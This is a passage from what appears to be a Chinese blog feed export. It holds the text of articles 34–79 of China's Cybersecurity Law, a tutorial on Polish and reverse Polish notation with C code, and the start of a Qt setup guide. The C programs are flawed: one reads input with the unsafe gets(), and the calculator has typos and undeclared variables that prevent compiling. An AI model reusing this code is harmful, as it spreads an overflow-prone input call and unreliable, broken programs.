除本法第二十一条的规定外，关键信息基础设施的运营者还应当履行下列安全保护义务：</p><p>（一）设置专门安全管理机构和安全管理负责人，并对该负责人和关键岗位的人员进行安全背景审查；</p><p>（二）定期对从业人员进行网络安全教育、技术培训和技能考核；</p><p>（三）对重要系统和数据库进行容灾备份；</p><p>（四）制定网络安全事件应急预案，并定期进行演练；</p><p>（五）法律、行政法规规定的其他义务。</p><p><strong>第三十五条</strong> 关键信息基础设施的运营者采购网络产品和服务，可能影响国家安全的，应当通过国家网信部门会同国务院有关部门组织的国家安全审查。</p><p><strong>第三十六条</strong> 关键信息基础设施的运营者采购网络产品和服务，应当按照规定与提供者签订安全保密协议，明确安全和保密义务与责任。</p><p><strong>第三十七条</strong> 关键信息基础设施的运营者在中华人民共和国境内运营中收集和产生的个人信息和重要数据应当在境内存储。因业务需要，确需向境外提供的，应当按照国家网信部门会同国务院有关部门制定的办法进行安全评估；法律、行政法规另有规定的，依照其规定。</p><p><strong>第三十八条</strong> 关键信息基础设施的运营者应当自行或者委托网络安全服务机构对其网络的安全性和可能存在的风险每年至少进行一次检测评估，并将检测评估情况和改进措施报送相关负责关键信息基础设施安全保护工作的部门。</p><p><strong>第三十九条</strong> 国家网信部门应当统筹协调有关部门对关键信息基础设施的安全保护采取下列措施：</p><p>（一）对关键信息基础设施的安全风险进行抽查检测，提出改进措施，必要时可以委托网络安全服务机构对网络存在的安全风险进行检测评估；</p><p>（二）定期组织关键信息基础设施的运营者进行网络安全应急演练，提高应对网络安全事件的水平和协同配合能力；</p><p>（三）促进有关部门、关键信息基础设施的运营者以及有关研究机构、网络安全服务机构等之间的网络安全信息共享；</p><p>（四）对网络安全事件的应急处置与网络功能的恢复等，提供技术支持和协助。</p><p><strong>第四章 网络信息安全</strong></p><p><strong>第四十条</strong> 网络运营者应当对其收集的用户信息严格保密，并建立健全用户信息保护制度。</p><p><strong>第四十一条</strong> 网络运营者收集、使用个人信息，应当遵循合法、正当、必要的原则，公开收集、使用规则，明示收集、使用信息的目的、方式和范围，并经被收集者同意。</p><p>网络运营者不得收集与其提供的服务无关的个人信息，不得违反法律、行政法规的规定和双方的约定收集、使用个人信息，并应当依照法律、行政法规的规定和与用户的约定，处理其保存的个人信息。</p><p><strong>第四十二条</strong> 网络运营者不得泄露、篡改、毁损其收集的个人信息；未经被收集者同意，不得向他人提供个人信息。但是，经过处理无法识别特定个人且不能复原的除外。</p><p>网络运营者应当采取技术措施和其他必要措施，确保其收集的个人信息安全，防止信息泄露、毁损、丢失。在发生或者可能发生个人信息泄露、毁损、丢失的情况时，应当立即采取补救措施，按照规定及时告知用户并向有关主管部门报告。</p><p><strong>第四十三条</strong> 个人发现网络运营者违反法律、行政法规的规定或者双方的约定收集、使用其个人信息的，有权要求网络运营者删除其个人信息；发现网络运营者收集、存储的其个人信息有错误的，有权要求网络运营者予以更正。网络运营者应当采取措施予以删除或者更正。</p><p><strong>第四十四条</strong> 任何个人和组织不得窃取或者以其他非法方式获取个人信息，不得非法出售或者非法向他人提供个人信息。</p><p><strong>第四十五条</strong> 依法负有网络安全监督管理职责的部门及其工作人员，必须对在履行职责中知悉的个人信息、隐私和商业秘密严格保密，不得泄露、出售或者非法向他人提供。</p><p><strong>第四十六条</strong> 任何个人和组织应当对其使用网络的行为负责，不得设立用于实施诈骗，传授犯罪方法，制作或者销售违禁物品、管制物品等违法犯罪活动的网站、通讯群组，不得利用网络发布涉及实施诈骗，制作或者销售违禁物品、管制物品以及其他违法犯罪活动的信息。</p><p><strong>第四十七条</strong> 网络运营者应当加强对其用户发布的信息的管理，发现法律、行政法规禁止发布或者传输的信息的，应当立即停止传输该信息，采取消除等处置措施，防止信息扩散，保存有关记录，并向有关主管部门报告。</p><p><strong>第四十八条</strong> 任何个人和组织发送的电子信息、提供的应用软件，不得设置恶意程序，不得含有法律、行政法规禁止发布或者传输的信息。</p><p>电子信息发送服务提供者和应用软件下载服务提供者，应当履行安全管理义务，知道其用户有前款规定行为的，应当停止提供服务，采取消除等处置措施，保存有关记录，并向有关主管部门报告。</p><p><strong>第四十九条</strong> 网络运营者应当建立网络信息安全投诉、举报制度，公布投诉、举报方式等信息，及时受理并处理有关网络信息安全的投诉和举报。</p><p>网络运营者对网信部门和有关部门依法实施的监督检查，应当予以配合。</p><p><strong>第五十条</strong> 国家网信部门和有关部门依法履行网络信息安全监督管理职责，发现法律、行政法规禁止发布或者传输的信息的，应当要求网络运营者停止传输，采取消除等处置措施，保存有关记录；对来源于中华人民共和国境外的上述信息，应当通知有关机构采取技术措施和其他必要措施阻断传播。</p><p><strong>第五章 监测预警与应急处置</strong></p><p><strong>第五十一条</strong> 国家建立网络安全监测预警和信息通报制度。国家网信部门应当统筹协调有关部门加强网络安全信息收集、分析和通报工作，按照规定统一发布网络安全监测预警信息。</p><p><strong>第五十二条</strong> 负责关键<a href="https://baike.baidu.com/item/%E4%BF%A1%E6%81%AF%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD" target="_blank" rel="noopener">信息基础设施</a>安全保护工作的部门，应当建立健全本行业、本领域的网络安全监测预警和信息通报制度，并按照规定报送网络安全监测预警信息。</p><p><strong>第五十三条</strong> 国家网信部门协调有关部门建立健全网络安全风险评估和应急工作机制，制定网络安全事件应急预案，并定期组织演练。</p><p>负责关键信息基础设施安全保护工作的部门应当制定本行业、本领域的网络安全事件应急预案，并定期组织演练。</p><p>网络安全事件应急预案应当按照事件发生后的危害程度、影响范围等因素对网络安全事件进行分级，并规定相应的应急处置措施。</p><p><strong>第五十四条</strong> 网络安全事件发生的风险增大时，省级以上人民政府有关部门应当按照规定的权限和程序，并根据网络安全风险的特点和可能造成的危害，采取下列措施：</p><p>（一）要求有关部门、机构和人员及时收集、报告有关信息，加强对网络安全风险的监测；</p><p>（二）组织有关部门、机构和专业人员，对网络安全风险信息进行分析评估，预测事件发生的可能性、影响范围和危害程度；</p><p>（三）向社会发布网络安全风险预警，发布避免、减轻危害的措施。</p><p><strong>第五十五条</strong> 发生网络安全事件，应当立即启动网络安全事件应急预案，对网络安全事件进行调查和评估，要求网络运营者采取技术措施和其他必要措施，消除安全隐患，防止危害扩大，并及时向社会发布与公众有关的警示信息。</p><p><strong>第五十六条</strong> 省级以上人民政府有关部门在履行网络安全监督管理职责中，发现网络存在较大安全风险或者发生安全事件的，可以按照规定的权限和程序对该网络的运营者的法定代表人或者主要负责人进行约谈。网络运营者应当按照要求采取措施，进行整改，消除隐患。</p><p><strong>第五十七条</strong> 因网络安全事件，发生突发事件或者生产安全事故的，应当依照《中华人民共和国突发事件应对法》、《中华人民共和国安全生产法》等有关法律、行政法规的规定处置。</p><p><strong>第五十八条</strong> 因维护国家安全和社会公共秩序，处置重大突发社会安全事件的需要，经国务院决定或者批准，可以在特定区域对网络通信采取限制等临时措施。</p><p><strong>第六章 法律责任</strong></p><p><strong>第五十九条</strong> 网络运营者不履行本法第二十一条、第二十五条规定的网络安全保护义务的，由有关主管部门责令改正，给予警告；拒不改正或者导致危害网络安全等后果的，处一万元以上十万元以下罚款，对直接负责的主管人员处五千元以上五万元以下罚款。</p><p>关键信息基础设施的运营者不履行本法第三十三条、第三十四条、第三十六条、第三十八条规定的网络安全保护义务的，由有关主管部门责令改正，给予警告；拒不改正或者导致危害网络安全等后果的，处十万元以上一百万元以下罚款，对直接负责的主管人员处一万元以上十万元以下罚款。</p><p><strong>第六十条</strong> 违反本法第二十二条第一款、第二款和第四十八条第一款规定，有下列行为之一的，由有关主管部门责令改正，给予警告；拒不改正或者导致危害网络安全等后果的，处五万元以上五十万元以下罚款，对直接负责的主管人员处一万元以上十万元以下罚款：</p><p>（一）设置恶意程序的；</p><p>（二）对其产品、服务存在的安全缺陷、漏洞等风险未立即采取补救措施，或者未按照规定及时告知用户并向有关主管部门报告的；</p><p>（三）擅自终止为其产品、服务提供安全维护的。</p><p><strong>第六十一条</strong> 网络运营者违反本法第二十四条第一款规定，未要求用户提供真实身份信息，或者对不提供真实身份信息的用户提供相关服务的，由有关主管部门责令改正；拒不改正或者情节严重的，处五万元以上五十万元以下罚款，并可以由有关主管部门责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。</p><p><strong>第六十二条</strong> 违反本法第二十六条规定，开展网络安全认证、检测、风险评估等活动，或者向社会发布系统漏洞、计算机病毒、网络攻击、网络侵入等网络安全信息的，由有关主管部门责令改正，给予警告；拒不改正或者情节严重的，处一万元以上十万元以下罚款，并可以由有关主管部门责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处五千元以上五万元以下罚款。</p><p><strong>第六十三条</strong> 违反本法第二十七条规定，从事危害网络安全的活动，或者提供专门用于从事危害网络安全活动的程序、工具，或者为他人从事危害网络安全的活动提供技术支持、广告推广、支付结算等帮助，尚不构成犯罪的，由公安机关没收违法所得，处五日以下拘留，可以并处五万元以上五十万元以下罚款；情节较重的，处五日以上十五日以下拘留，可以并处十万元以上一百万元以下罚款。</p><p>单位有前款行为的，由公安机关没收违法所得，处十万元以上一百万元以下罚款，并对直接负责的主管人员和其他直接责任人员依照前款规定处罚。</p><p>违反本法第二十七条规定，受到治安管理处罚的人员，五年内不得从事网络安全管理和网络运营关键岗位的工作；受到刑事处罚的人员，终身不得从事网络安全管理和网络运营关键岗位的工作。</p><p><strong>第六十四条</strong> 网络运营者、网络产品或者服务的提供者违反本法第二十二条第三款、第四十一条至第四十三条规定，侵害个人信息依法得到保护的权利的，由有关主管部门责令改正，可以根据情节单处或者并处警告、没收违法所得、处违法所得一倍以上十倍以下罚款，没有违法所得的，处一百万元以下罚款，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款；情节严重的，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照。</p><p>违反本法第四十四条规定，窃取或者以其他非法方式获取、非法出售或者非法向他人提供个人信息，尚不构成犯罪的，由公安机关没收违法所得，并处违法所得一倍以上十倍以下罚款，没有违法所得的，处一百万元以下罚款。</p><p><strong>第六十五条</strong> 关键信息基础设施的运营者违反本法第三十五条规定，使用未经安全审查或者安全审查未通过的网络产品或者服务的，由有关主管部门责令停止使用，处采购金额一倍以上十倍以下罚款；对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。</p><p><strong>第六十六条</strong> 关键信息基础设施的运营者违反本法第三十七条规定，在境外存储网络数据，或者向境外提供网络数据的，由有关主管部门责令改正，给予警告，没收违法所得，处五万元以上五十万元以下罚款，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照；对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。</p><p><strong>第六十七条</strong> 违反本法第四十六条规定，设立用于实施违法犯罪活动的网站、通讯群组，或者利用网络发布涉及实施违法犯罪活动的信息，尚不构成犯罪的，由公安机关处五日以下拘留，可以并处一万元以上十万元以下罚款；情节较重的，处五日以上十五日以下拘留，可以并处五万元以上五十万元以下罚款。关闭用于实施违法犯罪活动的网站、通讯群组。</p><p>单位有欠款行为的，由公安机关处十万元以上五十万元以下罚款，并对直接负责的主管人员和其他直接责任人员依照前款规定处罚。</p><p><strong>第六十八条</strong> 网络运营者违反本法第四十七条规定，对法律、行政法规禁止发布或者传输的信息未停止传输、采取消除等处置措施、保存有关记录的，由有关主管部门责令改正，给予警告，没收违法所得；拒不改正或者情节严重的，处十万元以上五十万元以下罚款，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。</p><p>电子信息发送服务提供者、应用软件下载服务提供者，不履行本法第四十八条第二款规定的安全管理义务的，依照前款规定处罚。</p><p><strong>第六十九条</strong> 网络运营者违反本法规定，有下列行为之一的，由有关主管部门责令改正；拒不改正或者情节严重的，处五万元以上五十万元以下罚款，对直接负责的主管人员和其他直接责任人员，处一万元以上十万元以下罚款：</p><p>（一）不按照有关部门的要求对法律、行政法规禁止发布或者传输的信息，采取停止传输、消除等处置措施的；</p><p>（二）拒绝、阻碍有关部门依法实施的监督检查的；</p><p>（三）拒不向公安机关、国家安全机关提供技术支持和协助的。</p><p><strong>第七十条</strong> 发布或者传输本法第十二条第二款和其他法律、行政法规禁止发布或者传输的信息的，依照有关法律、行政法规的规定处罚。</p><p><strong>第七十一条</strong> 有本法规定的违法行为的，依照有关法律、行政法规的规定记入信用档案，并予以公示。</p><p><strong>第七十二条</strong> 国家机关政务网络的运营者不履行本法规定的网络安全保护义务的，由其上级机关或者有关机关责令改正；对直接负责的主管人员和其他直接责任人员依法给予处分。</p><p><strong>第七十三条</strong> 网信部门和有关部门违反本法第三十条规定，将在履行网络安全保护职责中获取的信息用于其他用途的，对直接负责的主管人员和其他直接责任人员依法给予处分。</p><p>网信部门和有关部门的工作人员玩忽职守、滥用职权、徇私舞弊，尚不构成犯罪的，依法给予处分。</p><p><strong>第七十四条</strong> 违反本法规定，给他人造成损害的，依法承担民事责任。</p><p>违反本法规定，构成违反治安管理行为的，依法给予治安管理处罚；构成犯罪的，依法追究刑事责任。</p><p><strong>第七十五条</strong> 境外的机构、组织、个人从事攻击、侵入、干扰、破坏等危害中华人民共和国的关键信息基础设施的活动，造成严重后果的，依法追究法律责任；国务院公安部门和有关部门并可以决定对该机构、组织、个人采取冻结财产或者其他必要的制裁措施。</p><p><strong>第七章附 则</strong></p><p><strong>第七十六条</strong> 本法下列用语的含义：</p><p>（一）网络，是指由计算机或者其他信息终端及相关设备组成的按照一定的规则和程序对信息进行收集、存储、传输、交换、处理的系统。</p><p>（二）网络安全，是指通过采取必要措施，防范对网络的攻击、侵入、干扰、破坏和非法使用以及意外事故，使网络处于稳定可靠运行的状态，以及保障网络数据的完整性、保密性、可用性的能力。</p><p>（三）网络运营者，是指网络的所有者、管理者和网络服务提供者。</p><p>（四）网络数据，是指通过网络收集、存储、传输、处理和产生的各种电子数据。</p><p>（五）个人信息，是指以电子或者其他方式记录的能够单独或者与其他信息结合识别自然人个人身份的各种信息，包括但不限于自然人的姓名、出生日期、身份证件号码、个人生物识别信息、住址、电话号码等。</p><p><strong>第七十七条</strong> 存储、处理涉及国家秘密信息的网络的运行安全保护，除应当遵守本法外，还应当遵守保密法律、行政法规的规定。</p><p><strong>第七十八条</strong> 军事网络的安全保护，由中央军事委员会另行规定。</p><p><strong>第七十九条</strong> 本法自2017年6月1日起施行。</p>]]></content>
      
      
      <categories>
          
          <category> 综合 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>波兰式与逆波兰表达式</title>
      <link href="/2019/01/05/bo-lan-shi-yu-ni-bo-lan-biao-da-shi/"/>
      <url>/2019/01/05/bo-lan-shi-yu-ni-bo-lan-biao-da-shi/</url>
      
        <content type="html"><![CDATA[<h2 id="前缀、中缀、后缀表达式-逆波兰表达式-整体介绍"><a href="#前缀、中缀、后缀表达式-逆波兰表达式-整体介绍" class="headerlink" title="前缀、中缀、后缀表达式(逆波兰表达式)整体介绍"></a>前缀、中缀、后缀表达式(逆波兰表达式)整体介绍</h2><blockquote><p>前缀表达式、中缀表达式、后缀表达式都是四则运算的表达方式,用以四则运算表达式求值  ,即数学表达式的求值</p></blockquote><h3 id="一、中缀表达式"><a href="#一、中缀表达式" class="headerlink" title="一、中缀表达式"></a>一、中缀表达式</h3><h3 id="1-1、简介"><a href="#1-1、简介" class="headerlink" title="1.1、简介"></a>1.1、简介</h3><blockquote><p>中缀表达式就是常见的运算表达式，如(3+4)×5-6</p></blockquote><a id="more"></a><h3 id="二、前缀表达式"><a href="#二、前缀表达式" class="headerlink" title="二、前缀表达式"></a>二、前缀表达式</h3><h4 id="2-1、简介"><a href="#2-1、简介" class="headerlink" title="2.1、简介"></a>2.1、简介</h4><blockquote><p>前缀表达式又称波兰式，<strong>前缀表达式的运算符位于操作数之前</strong></p></blockquote><blockquote><p>比如:<strong>- × + 3 4 5 6</strong></p></blockquote><h4 id="2-2、如何通过前缀表达式来求值"><a href="#2-2、如何通过前缀表达式来求值" class="headerlink" title="2.2、如何通过前缀表达式来求值"></a>2.2、如何通过前缀表达式来求值</h4><blockquote><p>从右至左扫描表达式，遇到数字时，将数字压入堆栈，遇到运算符时，弹出栈顶的两个数，用运算符对它们做相应的计算（栈顶元素 op 次顶元素），并将结果入栈；重复上述过程直到表达式最左端，最后运算得出的值即为表达式的结果</p></blockquote><ul><li><p>例如:<strong>- × + 3 4 5 6</strong></p><blockquote><ol><li>从右至左扫描，将6、5、4、3压入堆栈</li><li>遇到+运算符，因此弹出3和4（3为栈顶元素，4为次顶元素，注意与后缀表达式做比较），计算出3+4的值，得7，再将7入栈</li><li>接下来是×运算符，因此弹出7和5，计算出7×5=35，将35入栈</li><li>最后是-运算符，计算出35-6的值，即29，由此得出最终结果</li></ol></blockquote></li></ul><h4 id="2-3、将中缀表达式转换为前缀表达式"><a href="#2-3、将中缀表达式转换为前缀表达式" class="headerlink" title="2.3、将中缀表达式转换为前缀表达式"></a>2.3、将中缀表达式转换为前缀表达式</h4><blockquote><p><strong>转换步骤如下</strong>:</p></blockquote><ol><li>初始化两个栈:运算符栈s1，储存中间结果的栈s2</li><li>从右至左扫描中缀表达式</li><li>遇到操作数时，将其压入s2</li><li>遇到运算符时，比较其与s1栈顶运算符的优先级<ol><li>如果s1为空，或栈顶运算符为右括号“)”，则直接将此运算符入栈</li><li>否则，若优先级比栈顶运算符的较高或相等，也将运算符压入s1</li><li>否则，将s1栈顶的运算符弹出并压入到s2中，再次转到(4-1)与s1中新的栈顶运算符相比较</li></ol></li><li>遇到括号时<ol><li>如果是右括号“)”，则直接压入s1</li><li>如果是左括号“(”，则依次弹出S1栈顶的运算符，并压入S2，直到遇到右括号为止，此时将这一对括号丢弃</li></ol></li><li>重复步骤2至5，直到表达式的最左边</li><li>将s1中剩余的运算符依次弹出并压入s2</li><li>依次弹出s2中的元素并输出，结果即为中缀表达式对应的前缀表达式</li></ol><blockquote><p><strong>例如:1+((2+3)×4)-5具体过程，如下表</strong></p></blockquote><p><img src="1.png" alt=""></p><blockquote><p><strong>结果是:- + 1 × + 2 3 4 5</strong></p></blockquote><h3 id="三、后缀表达式-逆波兰表达式"><a href="#三、后缀表达式-逆波兰表达式" class="headerlink" title="三、后缀表达式(逆波兰表达式)"></a>三、后缀表达式(逆波兰表达式)</h3><h4 id="3-1、简介"><a href="#3-1、简介" class="headerlink" title="3.1、简介"></a>3.1、简介</h4><blockquote><p>后缀表达式又称逆波兰表达式,与前缀表达式相似，只是运算符位于操作数之后</p></blockquote><blockquote><p>比如:<strong>3 4 + 5 × 6 -</strong></p></blockquote><h4 id="3-2、后缀表达式计算机求值"><a href="#3-2、后缀表达式计算机求值" class="headerlink" title="3.2、后缀表达式计算机求值"></a>3.2、后缀表达式计算机求值</h4><blockquote><p>与前缀表达式类似，只是顺序是从左至右：</p></blockquote><blockquote><p>从左至右扫描表达式，遇到数字时，将数字压入堆栈，遇到运算符时，弹出栈顶的两个数，用运算符对它们做相应的计算（次顶元素 op 栈顶元素），并将结果入栈；重复上述过程直到表达式最右端，最后运算得出的值即为表达式的结果</p></blockquote><blockquote><p><strong>例如后缀表达式“3 4 + 5 × 6 -”</strong>：</p></blockquote><ol><li>从左至右扫描，将3和4压入堆栈；</li><li>遇到+运算符，因此弹出4和3（4为栈顶元素，3为次顶元素，注意与前缀表达式做比较），计算出3+4的值，得7，再将7入栈；</li><li>将5入栈；</li><li>接下来是×运算符，因此弹出5和7，计算出7×5=35，将35入栈；</li><li>将6入栈；</li><li>最后是-运算符，计算出35-6的值，即29，由此得出最终结果。</li></ol><h4 id="3-3、将中缀表达式转换为后缀表达式步骤"><a href="#3-3、将中缀表达式转换为后缀表达式步骤" class="headerlink" title="3.3、将中缀表达式转换为后缀表达式步骤"></a>3.3、将中缀表达式转换为后缀表达式步骤</h4><blockquote><p>与转换为前缀表达式相似，步骤如下：</p></blockquote><ol><li>初始化两个栈：运算符栈s1和储存中间结果的栈s2；</li><li>从左至右扫描中缀表达式；</li><li>遇到操作数时，将其压s2；</li><li>遇到运算符时，比较其与s1栈顶运算符的优先级：<ol><li>如果s1为空，或栈顶运算符为左括号“(”，则直接将此运算符入栈；</li><li>否则，若优先级比栈顶运算符的高，也将运算符压入s1（<strong>注意转换为前缀表达式时是优先级较高或相同，而这里则不包括相同的情况</strong>）；</li><li>否则，将s1栈顶的运算符弹出并压入到s2中，再次转到(4-1)与s1中新的栈顶运算符相比较；</li></ol></li><li>遇到括号时：<ol><li>如果是左括号“(”，则直接压入s1；</li><li>如果是右括号“)”，则依次弹出s1栈顶的运算符，并压入s2，直到遇到左括号为止，此时将这一对括号丢弃；</li></ol></li><li>重复步骤2至5，直到表达式的最右边；</li><li>将s1中剩余的运算符依次弹出并压入s2；</li><li>依次弹出s2中的元素并输出，<strong>结果的逆序即为中缀表达式对应的后缀表达式（转换为前缀表达式时不用逆序）</strong></li></ol><blockquote><p><strong>例如，将中缀表达式“1+((2+3)×4)-5”转换为后缀表达式的过程如下</strong>：</p></blockquote><p><img src="2.png" alt=""></p><blockquote><p><strong>因此结果为“1 2 3 + 4 × + 5 -”</strong></p></blockquote><h4 id="3-4、C语言实现中缀表达式变后缀表达式"><a href="#3-4、C语言实现中缀表达式变后缀表达式" class="headerlink" title="3.4、C语言实现中缀表达式变后缀表达式"></a>3.4、C语言实现中缀表达式变后缀表达式</h4><pre><code>#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;typedef struct Node{    char ele;    struct Node * next;}Node;typedef Node * Stack;Stack MakeStack(void)//新建栈并返回栈顶{    Stack S = (Node *)malloc(sizeof(Node));    S-&gt;next = NULL;    return S;}void MakeNUll(Stack S)//置空栈{    S-&gt;next = NULL;}void Pop(Stack S)//将栈顶弹出{    Stack temp = S-&gt;next;    S-&gt;next = temp-&gt;next;}void Push(Stack S, char c)//将新节点压入栈{    Stack temp = (Node *)malloc(sizeof(Node));    temp-&gt;ele = c;    temp-&gt;next = S-&gt;next;    S-&gt;next = temp;}Stack FindHead(Stack S)//返回栈顶{    Stack temp = S-&gt;next;    return temp;}void PrintHead(Stack S)//打印栈顶元素{    Stack temp = S-&gt;next;    printf(&quot;%c&quot;, temp-&gt;ele);}int main(void){    Stack S = MakeStack();    int i = 0;    char str[200];    printf(&quot;Type something.\n&quot;);    gets(str);    while(str[i] != &#39;\0&#39;)    {        if(str[i] == &#39;+&#39; || str[i] == &#39;-&#39;)//如果str[i]是加号或减号，则先弹出栈顶直到栈已空或栈顶元素为左括号，再将str[i]压入栈        {            if(FindHead(S) == NULL)//若栈已空时，栈顶指针为空，找不到其元素，故须单独讨论            {                Push(S, str[i]);            }            else            {                while(FindHead(S)-&gt;ele == &#39;+&#39; || FindHead(S)-&gt;ele == &#39;-&#39; || FindHead(S)-&gt;ele == &#39;*&#39; || FindHead(S)-&gt;ele == &#39;/&#39;)                {                    PrintHead(S);                    Pop(S);                }                Push(S, str[i]);            }        }        else if(str[i] == &#39;*&#39; || str[i] == &#39;/&#39;)//如果str[i]是乘号或除号，则只有栈顶也是乘除号时才需要弹出        {            if(FindHead(S) == NULL)            {                Push(S, str[i]);            }            else            {                while(FindHead(S)-&gt;ele == &#39;*&#39; || FindHead(S)-&gt;ele == &#39;/&#39;)                {                    PrintHead(S);                    Pop(S);                }                Push(S, str[i]);            }        }        else if(str[i] == &#39;(&#39;)//如果str[i]是左括号则直接压入栈        {            Push(S, str[i]);        }        else if(str[i] == &#39;)&#39;)//如果str[i]是右括号，则打印并弹出栈中第一个左括号前的所有操作符，最后将此左括号直接弹出        {            while(FindHead(S)-&gt;ele != &#39;(&#39;)            {                PrintHead(S);                Pop(S);            }            Pop(S);        }        else//如果str[i]不是操作符则直接打印        {            printf(&quot;%c&quot;, str[i]);        }        i++;    }    while(FindHead(S) != NULL)//遍历后如果栈不为空，则弹出所有操作符    {        PrintHead(S);        Pop(S);    }    return 0;}</code></pre><h4 id="3-5、C语言实现逆波兰计算器"><a href="#3-5、C语言实现逆波兰计算器" class="headerlink" title="3.5、C语言实现逆波兰计算器"></a>3.5、C语言实现逆波兰计算器</h4><pre><code>#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;math.h&gt;#define STACK_INIT_SIZE 20#define STACKINCREMENT 10#define MAXBUFFER 10typedef double ElemType;typedef struct{    ElemType *base;    ElemType *top;    int stackSize;}sqStack;// 创建一个栈void InitStack(sqlStack *s){    s-&gt;base = (ElemType *)malloc(STACK_INIT_SIZE *sizeof(ElemType));    if(!s-&gt;base){        exit(0);    }    s-&gt;top = s-&gt;base;    s-&gt;stackSize = STACK_INIT_SIZE;}// 压栈void Push(sqStack *s, ElemType e){    if(s-&gt;top - s-&gt;base &gt;= s-&gt;stackSize){        s-&gt;base = (ElemType *)realloc(s-&gt;base, (s-&gt;stackSize + STACKINCREMENT)*sizeof(ElemType));        if(!s-&gt;base){            exit(0);        }    }    *(s-&gt;top) = e;    s-&gt;top++;}void Pop(sqStack *s, ElemType *e){    if(s-&gt;top == s-&gt;base){        return;    }    *e = *--(s-&gt;top);}// 计算栈的当前容量 int StackLen(sqStack s){    return (s.top - s.base);}double main(){    sqStack s;          char c;    double d, e;    char str[MAXBUFFER];    InitStacke(&amp;s);    printf(&quot;请按逆波兰表达式输入待计算数据，数据与运算符之间用空格隔开，以#号作为结束标志：\n&quot;);    scanf(&quot;%c&quot;, &amp;c);    while(C != &#39;#&#39;){        while(isdigit(c) || c==&#39;.&#39;){ // 用于过滤数字            str[i++] = c;            str[i] = &#39;\0&#39;;            if(i&gt;=10){                printf(&quot;出错：输入的单个数据过大!\n&quot;);                return -1;            }            scanf(&quot;%c&quot;, &amp;c);            if(c == &#39; &#39;){                d = atof(str);                Push(&amp;s, d);                i = 0;                break;            }        }        switch(c){            case &#39;+&#39;:                Pop(&amp;s, &amp;e);                Pop(&amp;s, &amp;d);                Push(&amp;s, d+e);                break;            case &#39;-&#39;:                Pop(&amp;s, &amp;e);                Pop(&amp;s, &amp;d);                Push(&amp;s, d-e);                break;            case &#39;*&#39;:                Pop(&amp;s, &amp;e);                Pop(&amp;s, &amp;d);                Push(&amp;s, d*e);                break;            case &#39;/&#39;:                Pop(&amp;s, &amp;e);                Pop(&amp;s, &amp;d);                if(e != 0){                    Push(&amp;s, d/e);                }else{                    printf(&quot;\n出错：除数为零!\n&quot;);                    return -1;                }                break;        }        scanf(&quot;%c&quot;, &amp;c);    }    Pop(&amp;s, &amp;d);    printf(&quot;\n最终的计算结果为:%f\n&quot;, d);    return 0;}// 计算案例 // 1 2 - 4 5 + *   结果：9.000000// 5 - (6 + 7) * 8 + 9 / 4      5 6 7 + 8 * - 9 4 / +   结果：-96.750000</code></pre>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Qt环境搭建以及自动打包</title>
      <link href="/2019/01/02/qt-huan-jing-da-jian-yi-ji-zi-dong-da-bao/"/>
      <url>/2019/01/02/qt-huan-jing-da-jian-yi-ji-zi-dong-da-bao/</url>
      
        <content type="html"><![CDATA[<h3 id="一、下载安装（Qt是什么就不用我说了-自行百度咯"><a href="#一、下载安装（Qt是什么就不用我说了-自行百度咯" class="headerlink" title="一、下载安装（Qt是什么就不用我说了 自行百度咯"></a>一、下载安装（Qt是什么就不用我说了 自行百度咯</h3><h4 id="1-官网下载"><a href="#1-官网下载" class="headerlink" title="1. 官网下载"></a>1. 官网下载</h4><p>开始我以为下载qtcreator就是下载了qt,然后发现居然下载qtcreator只是一个空壳，下载qt自带一个qtceator,折腾了老半天，嘤嘤嘤，所以下面地址是直接下载qt的<br><a href="http://download.qt.io/official_releases/qt/" target="_blank" rel="noopener">http://download.qt.io/official_releases/qt/</a></p><a id="more"></a><p>我下载的是qt-opensource-windows-x86-5.9.0.exe<br><img src="3.png" alt=""></p><h4 id="2-安装"><a href="#2-安装" class="headerlink" title="2. 安装"></a>2. 安装</h4><p>一路安装下去，此地无账号可以注册一个，为免费的开源版本<br><img src="1.png" alt=""><br>组件的选择，按需求下，以下是根据《Qt 5.9 C++开发指南》实例下载，这本书还是不错的<br><img src="2.png" alt=""></p><h4 id="3-一些小小的设置"><a href="#3-一些小小的设置" class="headerlink" title="3.一些小小的设置"></a>3.一些小小的设置</h4><p>设置部分都在Tools-&gt;options，里面有基本上所有的设置包括中文，但是非常不建议中文（你试试就知道了<br>在buiud&amp;run里面可以看到现在的编辑器，当前主要在使用Qt 5.9.0 MinGW 32bit<br><img src="4.png" alt=""><br>字体风格啥的就自己去瞅瞅就行了</p><h3 id="二、编译一个Hello-Kitty"><a href="#二、编译一个Hello-Kitty" class="headerlink" title="二、编译一个Hello Kitty"></a>二、编译一个Hello Kitty</h3><h4 id="1-新建一个项目"><a href="#1-新建一个项目" class="headerlink" title="1. 新建一个项目"></a>1. 新建一个项目</h4><p>选择左上角的FIle-&gt;New File or Project<br>这里选择第一个即可<br><img src="5.png" alt=""><br>然后Kit可以随意选择一个或者多个，会自动检测qt已经具备的Kit,当然全选也可以，反正玩玩而已<br><img src="6.png" alt=""></p><h4 id="2-项目文件结构"><a href="#2-项目文件结构" class="headerlink" title="2. 项目文件结构"></a>2. 项目文件结构</h4><p><img src="7.png" 